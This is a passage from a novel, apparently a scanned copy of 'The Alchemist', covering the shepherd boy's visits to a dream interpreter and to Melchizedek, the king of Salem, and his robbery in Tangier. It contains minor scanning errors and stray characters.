there was an old woman\nwho interpreted dreams.\nThe old woman led the boy to a room\nat the back of her house; it was\nseparated from her living room by a\ncurtain of colored beads. The room's\nfurnishings consisted of a table, an\nimage of the Sacred Heart of Jesus, and\ntwo chairs.\n\nThe woman sat down, and told him to\nbe seated as well. Then she took both\nof his hands in hers, and began quietly\nto pray.\n\nIt sounded like a Gypsy prayer. The\nboy had already had experience on the\nroad with Gypsies; they also traveled,\nbut they had no flocks of sheep. People\nsaid that Gypsies spent their lives\ntricking others. It was also said that\nthey had a pact with the devil, and that\nthey kidnapped children and, taking\nthem away to their mysterious camps,\nmade them their slaves. As a child, the\nboy had always been frightened to\ndeath that he would be captured by\nGypsies, and this childhood fear\nreturned when the old woman took his\nhands in hers.\n\nBut she has the Sacred Heart of Jesus\nthere, he thought, trying to reassure\nhimself. He didn't want his hand to\nbegin trembling, showing the old\nwoman that he was fearful. He recited\nan Our Father silently.\n\"Very interesting,” said the woman,\nnever taking her eyes from the boy's\nhands, and then she fell silent.\n\nThe boy was becoming nervous. His\nhands began to tremble, and the woman\nsensed it.\n\nHe quickly pulled his hands away.\n\n\"I didn't come here to have you read\nmy palm,\" he said, already regretting\nhaving come.\n\nHe thought for a moment that it would\nbe better to pay her fee and leave\nwithout learning a thing, that he was\ngiving too much importance to his\nrecurrent dream.\n\"You came so that you could learn\nabout your dreams,\" said the old\nwoman. \"And dreams are the language\nof God. When he speaks in our\nlanguage, I can interpret what he has\nsaid. But if he speaks in the language\nof the soul, it is only you who can\nunderstand.\n\nBut, whichever it is, I'm going to\ncharge you for the consultation.\"\n\nAnother trick, the boy thought. But he\ndecided to take a chance. A shepherd\nalways takes his chances with wolves\nand with drought, and that's what\nmakes a shepherd's life exciting.\n\n\"T have had the same dream twice,\" he\nsaid. \"I dreamed that I was in field\nwith my sheep, when a child appeared\nand began to play with the animals. I\ndon't like people to do that, because the\nsheep are afraid of strangers. But\nchildren always seem to be able to play\nwith them without frightening them. I\ndon't know why. I don't know how\nanimals know the age of human\nbeings.\"\n\n\"Tell me more about your dream,\" said\nthe woman. \"I have to get back to my\ncooking, and, since you don't have\nmuch money, I can't give you a lot of\ntime.”\n\n\"The child went on playing with my\nsheep for quite a while,\" continued the\nboy, a bit upset. \"And suddenly, the\nchild took me by both hands and\ntransported me to the Egyptian\npyramids.\"\n\nHe paused for a moment to see if the\nwoman knew what the Egyptian\npyramids were. But she said nothing.\n\n\"Then, at the Egyptian pyramids,\"—he\nsaid the last three words slowly, so that\nthe old woman would understand—\"the\nchild said to me, If you come here, you\nwill find a hidden treasure.' And, just\nas she was about to show me the exact\nlocation, I woke up.\n\nBoth times.\"\nThe woman was silent for some time.\nThen she again took his hands and\nstudied them carefully.\n\n\"I'm not going to charge you anything\nnow,\" she said. \"But I want one-tenth\nof the treasure, if you find it.”\n\nThe boy laughed—out of happiness. He\nwas going to be able to save the little\nmoney he had because of a dream\nabout hidden treasure!\n\n\"Well, interpret the dream,\" he said.\n\n\"First, swear to me. Swear that you will\ngive me one-tenth of your treasure in\nexchange for what I am going to tell\nyou.\"\nThe shepherd swore that he would. The\nold woman asked him to swear again\nwhile looking at the image of the\nSacred Heart of Jesus.\n\n\"It's a dream in the language of the\nworld,\" she said. \"I can interpret it, but\nthe interpretation is very difficult.\nThat's why I feel that I deserve a part\nof what you find.\n\n\"And this is my interpretation: you\nmust go to the Pyramids in Egypt. I\nhave never heard of them, but, if it was\na child who showed them to you, they\nexist. There you will find a treasure\nthat will make you a rich man.”\n\nThe boy was surprised, and then\nirritated. He didn't need to seek out the\nold woman for this! But then he\nremembered that he wasn't going to\nhave to pay anything.\n\n\"I didn't need to waste my time just for\nthis,\" he said.\n\n\"I told you that your dream was a\ndifficult one. It's the simple things in\nlife that are the most extraordinary;\nonly wise men are able to understand\nthem. And since I am not wise, I have\nhad to learn other arts, such as the\nreading of palms.\"\n\n\"Well, how am I going to get to\nEgypt?\"\n\"I only interpret dreams. I don't know\nhow to turn them into reality. That's\nwhy I have to live off what my\ndaughters provide me with.\"\n\n\"And what if I never get to Egypt?\"\n\n\"Then I don't get paid. It wouldn't be\nthe first time.\"\n\nAnd the woman told the boy to leave,\nsaying she had already wasted too\nmuch time with him.\n\nSo the boy was disappointed; he\ndecided that he would never again\nbelieve in dreams. He remembered that\nhe had a number of things he had to\ntake care of: he went to the market for\nsomething to eat, he traded his book for\none that was thicker, and he found a\nbench in the plaza where he could\nsample the new wine he had bought.\nThe day was hot, and the wine was\nrefreshing. The sheep were at the gates\nof the city, in a stable that belonged to\na friend. The boy knew a lot of people\nin the city. That was what made\ntraveling appeal to him—he always\nmade new friends, and he didn't need to\nspend all of his time with them.\n\nWhen someone sees the same people\nevery day, as had happened with him at\nthe seminary, they wind up becoming a\npart of that person's life. And then they\nwant the person to change. If someone\nisn't what others want them to be, the\nothers become angry.\n\nEveryone seems to have a clear idea of\nhow other people should lead their\nlives, but none about his or her own.\n\nHe decided to wait until the sun had\nsunk a bit lower in the sky before\nfollowing his flock back through the\nfields. Three days from now, he would\nbe with the merchant's daughter.\n\nHe started to read the book he had\nbought. On the very first page it\ndescribed a burial ceremony. And the\nnames of the people involved were\nvery difficult to pronounce. If he ever\nwrote a book, he thought, he would\npresent one person at a time, so that the\nreader wouldn't have to worry about\nmemorizing a lot of names.\n\nWhen he was finally able to\nconcentrate on what he was reading, he\nliked the book better; the burial was on\na snowy day, and he welcomed the\nfeeling of being cold. As he read on, an\nold man sat down at his side and tried\nto strike up a conversation.\n\n\"What are they doing?\" the old man\nasked, pointing at the people in the\nplaza.\n\n\"Working,\" the boy answered dryly,\nmaking it look as if he wanted to\nconcentrate on his reading.\nActually, he was thinking about\nshearing his sheep in front of the\nmerchant's daughter, so that she could\nsee that he was someone who was\ncapable of doing difficult things. He\nhad already imagined the scene many\ntimes; every time, the girl became\nfascinated when he explained that the\nsheep had to be sheared from back to\nfront. He also tried to remember some\ngood stories to relate as he sheared the\nsheep. Most of them he had read in\nbooks, but he would tell them as if they\nwere from his personal experience. She\nwould never know the difference,\nbecause she didn't know how to read.\n\nMeanwhile, the old man persisted in\nhis attempt to strike up a conversation.\nHe said that he was tired and thirsty,\nand asked if he might have a sip of the\nboy's wine. The boy offered his bottle,\nhoping that the old man would leave\nhim alone.\n\nBut the old man wanted to talk, and he\nasked the boy what book he was\nreading. The boy was tempted to be\nrude, and move to another bench, but\nhis father had taught him to be\nrespectful of the elderly. So he held out\nthe book to the man—for two reasons:\nfirst, that he, himself, wasn't sure how\nto pronounce the title; and second, that\nif the old man didn't know how to read,\nhe would probably feel ashamed and\ndecide of his own accord to change\nbenches.\n\n\"Hmm...\" said the old man, looking at\nall sides of the book, as if it were some\nstrange object. \"This is an important\nbook, but it's really irritating.”\n\nThe boy was shocked. The old man\nknew how to read, and had already read\nthe book.\n\nAnd if the book was irritating, as the\nold man had said, the boy still had time\nto change it for another.\n\n\"It's a book that says the same thing\nalmost all the other books in the world\nsay,\"\ncontinued the old man. \"It describes\npeople's inability to choose their own\ndestinies. And it ends up saying that\neveryone believes the world's greatest\nlie.”\n\n\"What's the world's greatest lie?\" the\nboy asked, completely surprised.\n\n\"It's this: that at a certain point in our\nlives, we lose control of what's\nhappening to us, and our lives become\ncontrolled by fate. That's the world's\ngreatest lie.\"\n\n\"That's never happened to me,\" the boy\nsaid. \"They wanted me to be a priest,\nbut I decided to become a shepherd.\"\n\"Much better,\" said the old man.\n\"Because you really like to travel.\"\n\n\"He knew what I was thinking,” the boy\nsaid to himself. The old man,\nmeanwhile, was leafing through the\nbook, without seeming to want to\nreturn it at all. The boy noticed that the\nman's clothing was strange. He looked\nlike an Arab, which was not unusual in\nthose parts. Africa was only a few\nhours from Tarifa; one had only to\ncross the narrow straits by boat. Arabs\noften appeared in the city, shopping\nand chanting their strange prayers\nseveral times a day.\n\n\"Where are you from?\" the boy asked.\n\"From many places.\"\n\n\"No one can be from many places,\" the\nboy said. \"I'm a shepherd, and I have\nbeen to many places, but I come from\nonly one place—from a city near an\nancient castle. That's where I was\nborn.\"\n\n\"Well then, we could say that I was\nborn in Salem.\"\n\nThe boy didn't know where Salem was,\nbut he didn't want to ask, fearing that\nhe would appear ignorant. He looked at\nthe people in the plaza for a while; they\nwere coming and going, and all of them\nseemed to be very busy.\n\"So, what is Salem like?\" he asked,\ntrying to get some sort of clue.\n\n\"It's like it always has been.\"\n\nNo clue yet. But he knew that Salem\nwasn't in Andalusia. If it were, he\nwould already have heard of it.\n\n\"And what do you do in Salem?\" he\ninsisted.\n\n\"What do I do in Salem?\" The old man\nlaughed. \"Well, I'm the king of Salem!\"\n\nPeople say strange things, the boy\nthought. Sometimes it's better to be\nwith the sheep, who don't say anything.\nAnd better still to be alone with one's\nbooks. They tell their incredible stories\nat the time when you want to hear\nthem. But when you're talking to\npeople, they say some things that are so\nstrange that you don't know how to\ncontinue the conversation.\n\n\"My name is Melchizedek,\" said the\nold man. \"How many sheep do you\nhave?\"\n\n\"Enough,\" said the boy. He could see\nthat the old man wanted to know more\nabout his life.\n\n\"Well, then, we've got a problem. I\ncan't help you if you feel you've got\nenough sheep.”\nThe boy was getting irritated. He\nwasn't asking for help. It was the old\nman who had asked for a drink of his\nwine, and had started the conversation.\n\n\"Give me my book,\" the boy said. \"I\nhave to go and gather my sheep and get\n\ngoing.”\n\n\"Give me one-tenth of your sheep,\"\nsaid the old man, \"and I'll tell you how\nto find the hidden treasure.\"\n\nThe boy remembered his dream, and\nsuddenly everything was clear to him.\nThe old woman hadn't charged him\nanything, but the old man—maybe he\nwas her husband—was going to find a\nway to get much more money in\nexchange for information about\nsomething that didn't even exist. The\nold man was probably a Gypsy, too.\n\nBut before the boy could say anything,\nthe old man leaned over, picked up a\nstick, and began to write in the sand of\nthe plaza. Something bright reflected\nfrom his chest with such intensity that\nthe boy was momentarily blinded. With\na movement that was too quick for\nsomeone his age, the man covered\nwhatever it was with his cape. When\nhis vision returned to normal, the boy\nwas able to read what the old man had\nwritten in the sand.\n\nThere, in the sand of the plaza of that\nsmall city, the boy read the names of\nhis father and his mother and the name\nof the seminary he had attended. He\nread the name of the merchant's\ndaughter, which he hadn't even known,\nand he read things he had never told\nanyone.\n\n水\n\n\"I'm the king of Salem,\" the old man\nhad said.\n\n\"Why would a king be talking with a\nshepherd?\" the boy asked, awed and\nembarrassed.\n\n\"For several reasons. But let's say that\nthe most important is that you have\nsucceeded in discovering your destiny.\"\n\nThe boy didn't know what a person's\n\"destiny\" was.\n\n\"It's what you have always wanted to\naccomplish. Everyone, when they are\nyoung, knows what their destiny is.\n\n\"At that point in their lives, everything\nis clear and everything is possible.\nThey are not afraid to dream, and to\nyearn for everything they would like to\nsee happen to them in their lives. But,\nas time passes, a mysterious force\nbegins to convince them that it will be\nimpossible for them to realize their\ndestiny.\"\nNone of what the old man was saying\nmade much sense to the boy. But he\nwanted to know what the \"mysterious\nforce\" was; the merchant's daughter\nwould be impressed when he told her\nabout that!\n\n\"It's a force that appears to be negative,\nbut actually shows you how to realize\nyour destiny. It prepares your spirit and\nyour will, because there is one great\ntruth on this planet: whoever you are,\nor whatever it is that you do, when you\nreally want something, it's because that\ndesire originated in the soul of the\nuniverse. It's your mission on earth.\"\n\n\"Even when all you want to do is\ntravel? Or marry the daughter of a\ntextile merchant?\"\n\n\"Yes, or even search for treasure. The\nSoul of the World is nourished by\npeople's happiness. And also by\nunhappiness, envy, and jealousy. To\nrealize one's destiny is a person's only\nreal obligation. All things are one.\n\n\"And, when you want something, all\nthe universe conspires in helping you\nto achieve it.\"\n\nThey were both silent for a time,\nobserving the plaza and the\ntownspeople. It was the old man who\nspoke first.\n\"Why do you tend a flock of sheep?\"\n\"Because I like to travel.\"\n\nThe old man pointed to a baker\nstanding in his shop window at one\ncorner of the plaza.\n\n\"When he was a child, that man wanted\nto travel, too. But he decided first to\nbuy his bakery and put some money\naside. When he's an old man, he's going\nto spend a month in Africa. He never\nrealized that people are capable, at any\ntime in their lives, of doing what they\ndream of.\"\n\n\"He should have decided to become a\nshepherd,\" the boy said.\n\"Well, he thought about that,\" the old\nman said. \"But bakers are more\nimportant people than shepherds.\nBakers have homes, while shepherds\nsleep out in the open. Parents would\nrather see their children marry bakers\nthan shepherds.\"\n\nThe boy felt a pang in his heart,\nthinking about the merchant's daughter.\nThere was surely a baker in her town.\n\nThe old man continued, \"In the long\nrun, what people think about shepherds\nand bakers becomes more important\nfor them than their own destinies.\"\n\nThe old man leafed through the book,\nand fell to reading a page he came to.\nThe boy waited, and then interrupted\nthe old man just as he himself had been\ninterrupted. \"Why are you telling me\nall this?\"\n\n\"Because you are trying to realize your\ndestiny. And you are at the point where\nyou're about to give it all up.\"\n\n\"And that's when you always appear on\nthe scene?\"\n\n\"Not always in this way, but I always\nappear in one form or another.\nSometimes I appear in the form of a\nsolution, or a good idea. At other times,\nat a crucial moment, I make it easier\nfor things to happen. There are other\nthings I do, too, but most of the time\npeople don't realize I've done them.\"\n\nThe old man related that, the week\nbefore, he had been forced to appear\nbefore a miner, and had taken the form\nof a stone. The miner had abandoned\neverything to go mining for emeralds.\nFor five years he had been working a\ncertain river, and had examined\nhundreds of thousands of stones\nlooking for an emerald. The miner was\nabout to give it all up, right at the point\nwhen, if he were to examine just one\nmore stone—just one more—he would\nfind his emerald. Since the miner had\nsacrificed everything to his destiny, the\nold man decided to become involved.\nHe transformed himself into a stone\nthat rolled up to the miner's foot. The\nminer, with all the anger and\nfrustration of his five fruitless years,\npicked up the stone and threw it aside.\nBut he had thrown it with such force\nthat it broke the stone it fell upon, and\nthere, embedded in the broken stone,\nwas the most beautiful emerald in the\nworld.\n\n\"People learn, early in their lives, what\nis their reason for being,\" said the old\nman, with a certain bitterness. \"Maybe\nthat's why they give up on it so early,\ntoo. But that's the way it is.\"\n\nThe boy reminded the old man that he\nhad said something about hidden\ntreasure.\n\n\"Treasure is uncovered by the force of\nflowing water, and it is buried by the\nsame currents,\" said the old man. \"If\nyou want to learn about your own\ntreasure, you will have to give me one-\ntenth of your flock.\"\n\n\"What about one-tenth of my\ntreasure?\"\n\nThe old man looked disappointed. \"If\nyou start out by promising what you\ndon't even have yet, you'll lose your\ndesire to work toward getting it.\"\n\nThe boy told him that he had already\npromised to give one-tenth of his\ntreasure to the Gypsy.\n\n\"Gypsies are experts at getting people\nto do that,\" sighed the old man. \"In any\ncase, it's good that you've learned that\neverything in life has its price. This is\nwhat the Warriors of the Light try to\nteach.\"\n\nThe old man returned the book to the\nboy.\n\n\"Tomorrow, at this same time, bring\nme a tenth of your flock. And I will tell\nyou how to find the hidden treasure.\nGood afternoon.\"\n\nAnd he vanished around the corner of\nthe plaza.\nThe boy began again to read his book,\nbut he was no longer able to\nconcentrate. He was tense and upset,\nbecause he knew that the old man was\nright. He went over to the bakery and\nbought a loaf of bread, thinking about\nwhether or not he should tell the baker\nwhat the old man had said about him.\nSometimes it's better to leave things as\nthey are, he thought to himself, and\ndecided to say nothing. If he were to\nsay anything, the baker would spend\nthree days thinking about giving it all\nup, even though he had gotten used to\nthe way things were. The boy could\ncertainly resist causing that kind of\nanxiety for the baker. So he began to\nwander through the city, and found\nhimself at the gates. There was a small\nbuilding there, with a window at which\npeople bought tickets to Africa. And he\nknew that Egypt was in Africa.\n\n\"Can I help you?\" asked the man\nbehind the window.\n\n\"Maybe tomorrow,\" said the boy,\nmoving away. If he sold just one of his\nsheep, he'd have enough to get to the\nother shore of the strait. The idea\nfrightened him.\n\n\"Another dreamer,\" said the ticket\nseller to his assistant, watching the boy\nwalk away.\n\"He doesn't have enough money to\ntravel.\"\n\nWhile standing at the ticket window,\nthe boy had remembered his flock, and\ndecided he should go back to being a\nshepherd. In two years he had learned\neverything about shepherding: he knew\nhow to shear sheep, how to care for\npregnant ewes, and how to protect the\nsheep from wolves. He knew all the\nfields and pastures of Andalusia. And\nhe knew what was the fair price for\nevery one of his animals.\n\nHe decided to return to his friend's\nstable by the longest route possible. As\nhe walked past the city's castle, he\ninterrupted his return, and climbed the\nstone ramp that led to the top of the\nwall. From there, he could see Africa in\nthe distance. Someone had once told\nhim that it was from there that the\nMoors had come, to occupy all of\nSpain.\n\nHe could see almost the entire city\nfrom where he sat, including the plaza\nwhere he had talked with the old man.\nCurse the moment I met that old man,\nhe thought. He had come to the town\nonly to find a woman who could\ninterpret his dream. Neither the woman\nnor the old man were at all impressed\nby the fact that he was a shepherd.\nThey were solitary individuals who no\nlonger believed in things, and didn't\nunderstand that shepherds become\nattached to their sheep. He knew\neverything about each member of his\nflock: he knew which ones were lame,\nwhich one was to give birth two\nmonths from now, and which were the\nlaziest. He knew how to shear them,\nand how to slaughter them. If he ever\ndecided to leave them, they would\nsuffer.\n\nThe wind began to pick up. He knew\nthat wind: people called it the levanter,\nbecause on it the Moors had come from\nthe Levant at the eastern end of the\nMediterranean.\nThe levanter increased in intensity.\nHere I am, between my flock and my\ntreasure, the boy thought. He had to\nchoose between something he had\nbecome accustomed to and something\nhe wanted to have. There was also the\nmerchant's daughter, but she wasn't as\nimportant as his flock, because she\ndidn't depend on him. Maybe she didn't\neven remember him. He was sure that\nit made no difference to her on which\nday he appeared: for her, every day was\nthe same, and when each day is the\nsame as the next, it's because people\nfail to recognize the good things that\nhappen in their lives every day that the\nsun rises.\nI left my father, my mother, and the\ntown castle behind. They have gotten\nused to my being away, and so have I.\nThe sheep will get used to my not\nbeing there, too, the boy thought.\n\nFrom where he sat, he could observe\nthe plaza. People continued to come\nand go from the baker's shop. A young\ncouple sat on the bench where he had\ntalked with the old man, and they\nkissed.\n\n\"That baker...\" he said to himself,\nwithout completing the thought. The\nlevanter was still getting stronger, and\nhe felt its force on his face. That wind\nhad brought the Moors, yes, but it had\nalso brought the smell of the desert and\nof veiled women. It had brought with it\nthe sweat and the dreams of men who\nhad once left to search for the\nunknown, and for gold and adventure—\nand for the Pyramids. The boy felt\njealous of the freedom of the wind, and\nsaw that he could have the same\nfreedom. There was nothing to hold\nhim back except himself. The sheep,\nthe merchant's daughter, and the fields\nof Andalusia were only steps along the\nway to his destiny.\n\nThe next day, the boy met the old man\nat noon. He brought six sheep with\nhim.\n\"I'm surprised,\" the boy said. \"My\nfriend bought all the other sheep\nimmediately. He said that he had\nalways dreamed of being a shepherd,\nand that it was a good omen.\"\n\n\"That's the way it always is,” said the\nold man. \"It's called the principle of\nfavorability.\n\nWhen you play cards the first time, you\nare almost sure to win. Beginner's\nluck.\"\n\n\"Why is that?\"\n\"Because there is a force that wants\n\nyou to realize your destiny; it whets\nyour appetite with a taste of success.\"\nThen the old man began to inspect the\nsheep, and he saw that one was lame.\nThe boy explained that it wasn't\nimportant, since that sheep was the\nmost intelligent of the flock, and\nproduced the most wool.\n\n\"Where is the treasure?\" he asked.\n\"It's in Egypt, near the Pyramids.\"\n\nThe boy was startled. The old woman\nhad said the same thing. But she hadn't\ncharged him anything.\n\n\"In order to find the treasure, you will\nhave to follow the omens. God has\nprepared a path for everyone to follow.\nYou just have to read the omens that he\nleft for you.\"\n\nBefore the boy could reply, a butterfly\nappeared and fluttered between him\nand the old man. He remembered\nsomething his grandfather had once\ntold him: that butterflies were a good\nomen. Like crickets, and like\nexpectations; like lizards and four-leaf\nclovers.\n\n\"That's right,\" said the old man, able to\nread the boy's thoughts. \"Just as your\ngrandfather taught you. These are good\nomens.\"\n\nThe old man opened his cape, and the\nboy was struck by what he saw. The old\nman wore a breastplate of heavy gold,\ncovered with precious stones. The boy\nrecalled the brilliance he had noticed\non the previous day.\n\nHe really was a king! He must be\ndisguised to avoid encounters with\nthieves.\n\n\"Take these,\" said the old man, holding\nout a white stone and a black stone that\nhad been embedded at the center of the\nbreastplate. \"They are called Urim and\nThummim. The black signifies 'yes,'\nand the white 'no.' When you are\nunable to read the omens, they will\nhelp you to do so. Always ask an\nobjective question.\n\n\"But, if you can, try to make your own\ndecisions. The treasure is at the\nPyramids; that you already knew. But I\nhad to insist on the payment of six\nsheep because I helped you to make\nyour decision.\"\n\nThe boy put the stones in his pouch.\nFrom then on, he would make his own\ndecisions.\n\n\"Don't forget that everything you deal\nwith is only one thing and nothing else.\nAnd don't forget the language of\nomens. And, above all, don't forget to\nfollow your destiny through to its\nconclusion.\n\n\"But before I go, I want to tell youa\nlittle story.\n\"A certain shopkeeper sent his son to\nlearn about the secret of happiness\nfrom the wisest man in the world. The\nlad wandered through the desert for\nforty days, and finally came upon a\nbeautiful castle, high atop a mountain.\nIt was there that the wise man lived.\n\n\"Rather than finding a saintly man,\nthough, our hero, on entering the main\nroom of the castle, saw a hive of\nactivity: tradesmen came and went,\npeople were conversing in the corners,\na small orchestra was playing soft\nmusic, and there was a table covered\nwith platters of the most delicious food\nin that part of the world. The wise man\nconversed with everyone, and the boy\nhad to wait for two hours before it was\nhis turn to be given the man's attention.\n\n\"The wise man listened attentively to\nthe boy's explanation of why he had\ncome, but told him that he didn't have\ntime just then to explain the secret of\nhappiness. He suggested that the boy\nlook around the palace and return in\ntwo hours.\n\n\" \"Meanwhile, I want to ask you to do\nsomething,’ said the wise man, handing\nthe boy a teaspoon that held two drops\nof oil. 'As you wander around, carry\nthis spoon with you without allowing\nthe oill to spill.’\n\n\"The boy began climbing and\ndescending the many stairways of the\npalace, keeping his eyes fixed on the\nspoon. After two hours, he returned to\nthe room where the wise man was.\n\n\"\"Well,' asked the wise man, 'did you\nsee the Persian tapestries that are\nhanging in my dining hall? Did you see\nthe garden that it took the master\ngardener ten years to create?\n\nDid you notice the beautiful\nparchments in my library?’\n\n\"The boy was embarrassed, and\nconfessed that he had observed\nnothing. His only concern had been not\nto spill the oill that the wise man had\nentrusted to him.\n\"\"Then go back and observe the\nmarvels of my world,' said the wise\nman. 'You cannot trust a man if you\ndon't know his house.'\n\n\"Relieved, the boy picked up the spoon\nand returned to his exploration of the\npalace, this time observing all of the\nworks of art on the ceilings and the\nwalls. He saw the gardens, the\nmountains all around him, the beauty\nof the flowers, and the taste with which\neverything had been selected. Upon\nreturning to the wise man, he related in\ndetail everything he had seen.\n\n\" \"But where are the drops of oill I\nentrusted to you?’ asked the wise man.\n\"Looking down at the spoon he held,\nthe boy saw that the oill was gone.\n\n\"'Well, there is only one piece of\nadvice I can give you,' said the wisest\nof wise men.\n\n“The secret of happiness is to see all the\nmarvels of the world, and never to\nforget the drops of oill on the spoon.\n\ntn\n\nThe shepherd said nothing. He had\nunderstood the story the old king had\ntold him. A shepherd may like to\ntravel, but he should never forget about\nhis sheep.\n\nThe old man looked at the boy and,\nwith his hands held together, made\nseveral strange gestures over the boy's\nhead. Then, taking his sheep, he walked\naway.\n\n水\n\nAt the highest point in Tarifa there is\nan old fort, built by the Moors. From\natop its walls, one can catch a glimpse\nof Africa. Melchizedek, the king of\nSalem, sat on the wall of the fort that\nafternoon, and felt the levanter blowing\nin his face. The sheep fidgeted nearby,\nuneasy with their new owner and\nexcited by so much change. All they\nwanted was food and water.\n\nMelchizedek watched a small ship that\nwas plowing its way out of the port. He\nwould never again see the boy, just as\nhe had never seen Abraham again after\nhaving charged him his one-tenth fee.\nThat was his work.\n\nThe gods should not have desires,\nbecause they don't have destinies. But\nthe king of Salem hoped desperately\nthat the boy would be successful.\n\nIt's too bad that he's quickly going to\nforget my name, he thought. I should\nhave repeated it for him. Then when he\nspoke about me he would say that I am\nMelchizedek, the king of Salem.\n\nHe looked to the skies, feeling a bit\nabashed, and said, \"I know it's the\nvanity of vanities, as you said, my\nLord. But an old king sometimes has to\ntake some pride in himself.\"\n\n水\n\nHow strange Africa is, thought the boy.\n\nHe was sitting in a bar very much like\nthe other bars he had seen along the\nnarrow streets of Tangier. Some men\nwere smoking from a gigantic pipe that\nthey passed from one to the other. In\njust a few hours he had seen men\nwalking hand in hand, women with\ntheir faces covered, and priests that\nclimbed to the tops of towers and\nchanted—as everyone about him went\nto their knees and placed their\nforeheads on the ground.\n\"A practice of infidels,\" he said to\nhimself. As a child in church, he had\nalways looked at the image of Saint\nSantiago Matamoros on his white\nhorse, his sword unsheathed, and\nfigures such as these kneeling at his\nfeet. The boy felt ill and terribly alone.\nThe infidels had an evil look about\nthem.\n\nBesides this, in the rush of his travels\nhe had forgotten a detail, just one\ndetail, which could keep him from his\ntreasure for a long time: only Arabic\nwas spoken in this country.\n\nThe owner of the bar approached him,\nand the boy pointed to a drink that had\nbeen served at the next table. It turned\nout to be a bitter tea. The boy preferred\nwine.\n\nBut he didn't need to worry about that\nright now. What he had to be concerned\nabout was his treasure, and how he was\ngoing to go about getting it. The sale of\nhis sheep had left him with enough\nmoney in his pouch, and the boy knew\nthat in money there was magic;\nwhoever has money is never really\nalone. Before long, maybe in just a few\ndays, he would be at the Pyramids. An\nold man, with a breastplate of gold,\nwouldn't have lied just to acquire six\nsheep.\nThe old man had spoken about signs\nand omens, and, as the boy was\ncrossing the strait, he had thought\nabout omens. Yes, the old man had\nknown what he was talking about:\nduring the time the boy had spent in the\nfields of Andalusia, he had become\nused to learning which path he should\ntake by observing the ground and the\nsky. He had discovered that the\npresence of a certain bird meant that a\nsnake was nearby, and that a certain\nshrub was a sign that there was water in\nthe area. The sheep had taught him\nthat.\n\nIf God leads the sheep so well, he will\nalso lead a man, he thought, and that\nmade him feel better. The tea seemed\nless bitter.\n\n\"Who are you?\" he heard a voice ask\nhim in Spanish.\n\nThe boy was relieved. He was thinking\nabout omens, and someone had\nappeared.\n\n\"How come you speak Spanish?\" he\nasked. The new arrival was a young\nman in Western dress, but the color of\nhis skin suggested he was from this\ncity. He was about the same age and\nheight as the boy.\n\n\"Almost everyone here speaks Spanish.\nWe're only two hours from Spain.\"\n\"Sit down, and let me treat you to\nsomething,\" said the boy. \"And ask for\na glass of wine for me. I hate this tea.\"\n\n\"There is no wine in this country,\" the\nyoung man said. \"The religion here\nforbids it.\"\n\nThe boy told him then that he needed to\nget to the Pyramids. He almost began\nto tell about his treasure, but decided\nnot to do so. If he did, it was possible\nthat the Arab would want a part of it as\npayment for taking him there. He\nremembered what the old man had said\nabout offering something you didn't\neven have yet.\n\n\"I'd like you to take me there if you\ncan. I can pay you to serve as my\nguide.\"\n\n\"Do you have any idea how to get\nthere?\" the newcomer asked.\n\nThe boy noticed that the owner of the\nbar stood nearby, listening attentively\nto their conversation. He felt uneasy at\nthe man's presence. But he had found a\nguide, and didn't want to miss out on an\nopportunity.\n\n\"You have to cross the entire Sahara\ndesert,\" said the young man. \"And to do\nthat, you need money. I need to know\nwhether you have enough.”\n\nThe boy thought it a strange question.\nBut he trusted in the old man, who had\nsaid that, when you really want\nsomething, the universe always\nconspires in your favor.\n\nHe took his money from his pouch and\nshowed it to the young man. The owner\nof the bar came over and looked, as\nwell. The two men exchanged some\nwords in Arabic, and the bar owner\nseemed irritated.\n\n\"Let's get out of here\" said the new\narrival. \"He wants us to leave.\"\n\nThe boy was relieved. He got up to pay\nthe bill, but the owner grabbed him and\nbegan to speak to him in an angry\nstream of words. The boy was strong,\nand wanted to retaliate, but he was ina\nforeign country. His new friend pushed\nthe owner aside, and pulled the boy\noutside with him. \"He wanted your\nmoney,\" he said. \"Tangier is not like\nthe rest of Africa. This is a port, and\nevery port has its thieves.\"\n\nThe boy trusted his new friend. He had\nhelped him out in a dangerous\nsituation. He took out his money and\ncounted it.\n\n\"We could get to the Pyramids by\ntomorrow,\" said the other, taking the\nmoney. \"But I have to buy two camels.\n\n۲\n\nThey walked together through the\nnarrow streets of Tangier. Everywhere\nthere were stalls with items for sale.\nThey reached the center of a large\nplaza where the market was held.\n\nThere were thousands of people there,\narguing, selling, and buying;\nvegetables for sale amongst daggers,\nand carpets displayed alongside\ntobacco. But the boy never took his eye\noff his new friend. After all, he had all\nhis money. He thought about asking\nhim to give it back, but decided that\nwould be unfriendly. He knew nothing\nabout the customs of the strange land\nhe was in.\n\n\"T'll just watch him,\" he said to\nhimself. He knew he was stronger than\nhis friend.\n\nSuddenly, there in the midst of all that\nconfusion, he saw the most beautiful\nsword he had ever seen. The scabbard\nwas embossed in silver, and the handle\nwas black and encrusted with precious\nstones. The boy promised himself that,\nwhen he returned from Egypt, he would\nbuy that sword.\n\n\"Ask the owner of that stall how much\nthe sword costs,\" he said to his friend.\nThen he realized that he had been\ndistracted for a few moments, looking\nat the sword. His heart squeezed, as if\nhis chest had suddenly compressed it.\nHe was afraid to look around, because\nhe knew what he would find. He\ncontinued to look at the beautiful\nsword for a bit longer, until he\nsummoned the courage to turn around.\n\nAll around him was the market, with\npeople coming and going, shouting and\nbuying, and the aroma of strange\nfoods... but nowhere could he find his\nnew companion.\n\nThe boy wanted to believe that his\nfriend had simply become separated\nfrom him by accident. He decided to\nstay right there and await his return. As\nhe waited, a priest climbed to the top of\na nearby tower and began his chant;\neveryone in the market fell to their\nknees, touched their foreheads to the\nground, and took up the chant. Then,\nlike a colony of worker ants, they\ndismantled their stalls and left.\n\nThe sun began its departure, as well.\nThe boy watched it through its\ntrajectory for some time, until it was\nhidden behind the white houses\nsurrounding the plaza. He recalled that\nwhen the sun had risen that morning,\nhe was on another continent, still a\nshepherd with sixty sheep, and looking\nforward to meeting with a girl. That\nmorning he had known everything that\nwas going to happen to him as he\nwalked through the familiar fields. But\nnow, as the sun began to set, he was in\na different country, a stranger in a\nstrange land, where he couldn't even\nspeak the language. He was no longer a\nshepherd, and he had nothing, not even\nthe money to return and start\neverything over.\n\nAll this happened between sunrise and\nsunset, the boy thought. He was feeling\nsorry for himself, and lamenting the\nfact that his life could have changed so\nsuddenly and so drastically.\n\nHe was so ashamed that he wanted to\ncry. He had never even wept in front of\nhis own sheep. But the marketplace\nwas empty, and he was far from home,\nso he wept. He wept because God was\nunfair, and because this was the way\nGod repaid those who believed in their\ndreams.\n\nWhen 1] had my sheep, I was happy, and\nI made those around me happy. People\nsaw me coming and welcomed me, he\nthought. But now I'm sad and 